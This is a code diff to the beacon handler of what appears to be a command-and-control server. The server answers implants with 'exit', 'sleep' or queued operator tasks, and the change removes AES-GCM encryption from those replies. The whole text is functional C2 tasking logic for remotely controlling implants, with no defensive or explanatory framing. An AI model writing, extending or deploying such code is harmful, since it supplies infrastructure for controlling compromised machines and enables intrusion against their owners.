@@ -425,18 +425,14 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
 
   // Rejected sessions get exit; pending sessions sleep until accepted
   if (status === "rejected") {
-    const plainResponse = JSON.stringify({ cmd: "exit" });
-    const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
     await logAudit(env.GHOST_KV, { ts, action: "beacon_rejected", ip, detail: { sid } });
-    return jsonResponse({ enc: encryptedResponse });
+    return jsonResponse({ cmd: "exit" });
   }
 
   if (status === "pending") {
     console.log(`[beacon] sid=${sid} ip=${ip} PENDING (awaiting operator accept)`);
     await logAudit(env.GHOST_KV, { ts, action: "beacon", ip, detail: { sid, status: "pending" } });
-    const plainResponse = JSON.stringify({ cmd: "sleep" });
-    const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
-    return jsonResponse({ enc: encryptedResponse });
+    return jsonResponse({ cmd: "sleep" });
   }
 
   const tasks = await getTasks(env.GHOST_KV, sid);
@@ -449,12 +445,8 @@ async function handleBeacon(request: Request, env: Env): Promise<Response> {
     console.log(`[beacon] sid=${sid} ip=${ip} sleep`);
   }
 
-  // log every beacon so audit shows activity
   await logAudit(env.GHOST_KV, { ts, action: "beacon", ip, detail: { sid } });
-
-  const plainResponse = JSON.stringify({ cmd });
-  const encryptedResponse = await encryptAesGcm(keyBytes, plainResponse);
-  return jsonResponse({ enc: encryptedResponse });
+  return jsonResponse({ cmd });
 }
 
 async function handleResult(request: Request, env: Env): Promise<Response> {
